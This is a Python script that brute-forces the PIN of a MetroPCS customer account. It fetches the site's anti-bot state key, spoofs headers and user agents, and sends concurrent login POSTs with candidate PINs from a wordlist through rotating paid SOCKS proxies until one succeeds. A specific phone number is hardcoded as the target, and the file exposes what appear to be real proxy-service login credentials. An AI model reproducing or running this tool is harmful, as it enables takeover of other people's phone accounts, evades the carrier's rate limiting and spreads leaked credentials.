import aiodns
import cchardet
from aiohttp import ClientSession
from aiohttp.client_exceptions import ServerDisconnectedError, ClientOSError
import requests
import json
import re
import os
import time
import random
import concurrent.futures
import socks
import asyncio
import multiprocessing as mp
import logging, coloredlogs
import sqlite3
from tenacity import retry, wait_random, retry_if_exception_type
from aiohttp_socks import SocksConnector, SocksVer
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # suppress urllib insecure warnings.
logger = logging.getLogger(__name__)
coloredlogs.install(level=logging.DEBUG)
logger.debug("Test debug message.")


class RetryException(Exception):
    # Raise this to trigger tenacity to retry.
    pass

class MetroSexual(object):

    def __init__(self, path):

        logger.debug("Init MetroSexual.")

        self.api_url = "https://205.216.27.79/api/v1/account/user/authenticate"
        self.login_url = "https://205.216.27.79/my-account/sign-in"
        self.csrf_url = "https://205.216.27.79/common/metropcs_common.js"

        self.path = path
        #manager = mp.Manager()
        #self.shared_list = manager.list() # Store times taken for chunks. Lets us get overall average speed

        self.headers = {"User-Agent": self.random_ua(),
                        "Host": "www.metropcs.com",
                        "Referer": "https://www.metropcs.com/my-account/sign-in"}

        self.DB_PATH = './ico_data.db'

        self.uniqueStateKey = ''
        self.header_a = ''
        self.header_b = ''
        self.header_c = ''
        self.header_d = '0'

    def random_ua(self):

        user_agent_list = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
            'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            # Firefox
            'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
            'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
            'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
        ]
        return user_agent_list[random.randint(0, len(user_agent_list) - 1)]

    def fetch_proxies(self):

        logger.info("[+] Fetching fresh proxies...")
        proxy_uname = "robert.paul6@gmail.com"
        proxy_pass = "rYH14XxbN7fmJdagXasE"
        proxy_api = f"http://list.didsoft.com/get?email={proxy_uname}&pass={proxy_pass}&pid=sockspremium"

        conn = sqlite3.connect(self.DB_PATH)
        cur = conn.cursor()

        req = requests.get(proxy_api)

        with open('./proxy.cache', 'wb') as f:
            f.write(req.content)

        with open('./proxy.cache', 'r') as f:
            proxies = f.readlines()
        logger.info(f"[+] Found {len(proxies)} proxies. Updating proxy database.")
        for proxy in proxies:
            prox = proxy.split("#")
            try:
                cur.execute('INSERT INTO proxies (proxy, proxy_type, country) VALUES (?,?,?);', (prox[0], prox[1], prox[2].rstrip('\n')))
                conn.commit()
            except sqlite3.IntegrityError:
                logger.debug(f"[-] Already have proxy {prox[0]} added.")

        logger.debug("[-] Done updating proxies.")
        conn.commit()
        conn.close()

    def reset_proxies(self):
        #resets all proxies to enabled.
        conn = sqlite3.connect(self.DB_PATH)
        cur = conn.cursor()

        cur.execute("SELECT proxy FROM proxies WHERE is_enabled = 0;")
        rows = cur.fetchall()
        for row in rows:
            proxy = row[0]

            cur.execute("UPDATE proxies SET is_enabled = 1 WHERE proxy = ?;", (proxy,))
            conn.commit()

        conn.commit()
        conn.close()

    def update_proxy(self, proxy, state):
        # Remove a proxy from the pool
        conn = sqlite3.connect(self.DB_PATH)
        cur = conn.cursor()

        cur.execute('UPDATE proxies SET is_enabled = ? WHERE proxy = ?;', (state, proxy))
        conn.commit()
        conn.close()

    @retry(retry=retry_if_exception_type(RetryException))
    def rand_proxy(self):

        conn = sqlite3.connect(self.DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT proxy, proxy_type FROM proxies WHERE is_enabled = 1 ORDER BY RANDOM();")
        row = cur.fetchone()
        if row is None:
            raise RetryException() # Retry if there is no proxy, useful if we are fetching by country.
        conn.close()

        return row

    def login_attempt(self, phone_num):

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
                   "Host": "www.metropcs.com",
                   "Referer": "https://www.metropcs.com/my-account/sign-in"}
        s = requests.Session()
        s.headers.update(headers) # add a user agent.
        s.proxies.update({
            'http': 'http://127.0.0.1:8080',
            'https': 'https://127.0.0.1:8080'
        })
        pin = 123456789
        data = {
            'mdn': phone_num,
            'verificationType': 'P',
            'verificationValue': str(pin) # PIN needs to be a JSON string
        }

        s.get(self.login_url, verify=False)
        resp = s.get(self.csrf_url, verify=False)
        resp_dec = resp.content.decode('utf8')
        csrf_token = re.search(r'bundle\.init\(\"(.*?)\"', resp_dec)
        csrf_token = csrf_token.groups()[0]
        self.uniqueStateKey = csrf_token
        logger.info(f"Got X-49eXVsBl-uniqueStateKey: {csrf_token}")
        logger.debug(f"Updating headers...")

        if csrf_token is None:
            logger.error("Could not find uniqueStateKey. Exiting...")
            exit(1)

        headers['X-49eXVsBl-uniqueStateKey'] = self.uniqueStateKey
        headers['X-49eXVsBl-a'] = self.header_a
        headers['X-49eXVsBl-b'] = self.header_b
        headers['X-49eXVsBl-c'] = self.header_c
        headers['X-49eXVsBl-d'] = self.header_d
        headers['Host'] = 'hola.metropcs.com'
        headers['Referrer'] = 'https://hola.metropcs.com/my-account/sign-in'
        s.headers.update(headers)

        resp = s.post(self.api_url, json=data, verify=False)
        logger.debug(f"Got response: {json.loads(resp)}")

        s.close()

    def run_parallel(self, phone_num, processes=mp.cpu_count()):

        #try:
        pool = mp.Pool(processes)
        jobs = []
        # run for chunks of files
        for chunkStart,chunkSize in self.chunkify(self.path):
            jobs.append(pool.apply_async(self.process_helper,(chunkStart,chunkSize, phone_num)))
        for job in jobs:
            job.get()
        pool.close()
        #except Exception as e:
        #    logger.error(f"Got an error: {e}")

    def process_helper(self, chunkStart, chunkSize, phone_num):
        loop = asyncio.get_event_loop()
        try:
            future = asyncio.ensure_future(self.process_wrapper(chunkStart, chunkSize, phone_num))
            loop.run_until_complete(future)
        except concurrent.futures._base.TimeoutError:
            logger.error("One of the coroutines took too long.")

    async def process_wrapper(self, chunkStart, chunkSize, phone_num):

        logger.info("")
        rproxy = self.rand_proxy()
        proxy_url = f"{rproxy[1]}://{rproxy[0]}"
        connector = SocksConnector.from_url(proxy_url)
        session = ClientSession(connector=connector, headers=self.headers)
        headers = self.headers

        tasks = []
        # create instance of Semaphore
        sem = asyncio.Semaphore(10000)

        logger.info("Setting initial session and bypassing CSRF checks.")

        async with session.get(self.login_url) as resp:
            if resp.status == 200:
                logger.debug("Got login page. Setting cookies...")

        async with session.get(self.csrf_url) as resp:
            if resp.status == 200:
                logger.debug("Got CSRF page. Looking for token.")
                html = await resp.read()
                csrf_token = re.search(r'bundle\.init\(\"(.*?)\"', html)
                csrf_token = csrf_token.groups()[0]
                logger.debug(f"CSRF Token: {csrf_token}")
                headers['X-49eXVsBl-uniqueStateKey'] = self.uniqueStateKey
                headers['X-49eXVsBl-a'] = self.header_a
                headers['X-49eXVsBl-b'] = self.header_b
                headers['X-49eXVsBl-c'] = self.header_c
                headers['X-49eXVsBl-d'] = self.header_d
                headers['Host'] = 'hola.metropcs.com'
                headers['Referrer'] = 'https://hola.metropcs.com/my-account/sign-in'

            else:
                logger.warning("Could not find CSRF Token.")
                exit()

        with open(self.path, 'rb') as f:
            logger.info(f"Seeking to chunk position: {chunkStart}...")
            f.seek(chunkStart)
            lines = f.read(chunkSize).splitlines()
            logger.debug(f"Fetched {len(lines)} PINs")
            start_time = time.time()
            async with session as ses:
                for pin in lines:
                    task = asyncio.ensure_future(self.bound_post(sem=sem,
                                                                 url=self.api_url,
                                                                 session=ses,
                                                                 proxy=rproxy[0],
                                                                 headers=headers,
                                                                 phone_num=phone_num,
                                                                 pin=pin))
                    tasks.append(task)

                await asyncio.gather(*tasks)
            end_time = time.time()
            took = round(end_time - start_time, 2)
            req_per_second = round(len(lines) / took, 2)
            self.shared_list.append(req_per_second)
            if len(self.shared_list) != 0:
                avg_req_sec = round((sum(self.shared_list) / len(self.shared_list) * 24), 2)
            else:
                avg_req_sec = None
            await session.close()
            logger.info(f"Chunk took {took} seconds. Thread rate: {req_per_second} req/sec. Average: {avg_req_sec} req/sec")

    # Splitting data into chunks for parallel processing
    def chunkify(self, filename, size=1024*100):
        fileEnd = os.path.getsize(filename)
        with open(filename,'rb') as f:
            chunkEnd = f.tell()
            while True:
                chunkStart = chunkEnd
                f.seek(size,1)
                f.readline()
                chunkEnd = f.tell()
                yield chunkStart, chunkEnd - chunkStart
                if chunkEnd > fileEnd:
                    break

    @retry(retry_if_exception_type(RetryException))
    async def fetch(self, url, session, proxy):
        try:
            async with session.get(url) as response:
                return await response.read()
        except (ServerDisconnectedError, ClientOSError) as err:
            logger.debug(f"Got a server disconnect when attempting: {url}")
            raise RetryException()
        except socks.GeneralProxyError as err:
            logger.error(f"Issue with proxy, removing from pool and rotating")
            self.update_proxy(proxy=proxy, state=0)
            raise RetryException()

    @retry(retry_if_exception_type(RetryException))
    async def push(self, url, session, proxy, headers, data):
        try:
            async with session.post(url, headers=headers, data=data) as response:
                code = response.status
                resp_data = await response.read()
                return {'code': code, 'response': resp_data}
        except (ServerDisconnectedError, ClientOSError) as err:
            logger.debug(f"Got a server disconnect when attempting: {url}")
            raise RetryException()
        except socks.GeneralProxyError as err:
            logger.error(f"Issue with proxy, removing from pool and rotating")
            self.update_proxy(proxy=proxy, state=0)
            raise RetryException()

    async def bound_fetch(self, sem, url, proxy, session):
        # Getter function with semaphore.
        async with sem:
            response = await self.fetch(url, session, proxy)
            response = json.loads(response)
            logger.info(f"Got Response: {response}")

    async def bound_post(self, sem, url, session, proxy, headers, phone_num, pin):

        data = {
            'mdn': str(phone_num), # MDN must be a STR for the JSON POST.
            'verificationType': 'P',
            'verificationValue': str(pin) # PIN needs to be a string for the JSON POST.
        }

        async with sem:
            response = await self.push(url, session, proxy, headers, data)
            if response.get('code') == 200:
                logger.info(f"[+] FOUND PIN! {pin}")
                logger.debug(f"Full response: {response}")
                exit(0)
            elif response.get('code') == 400:
                logger.debug(f"Got response w/ 400: {response}")
            else:
                response.warning(f"Got an unknown response: {response}")
                exit(1)


if __name__ == "__main__":

    phone_num = '4073938013'

    msexy = MetroSexual('./pins.txt')
    #msexy.fetch_proxies()
    #msexy.reset_proxies()
    #msexy.run_parallel(phone_num)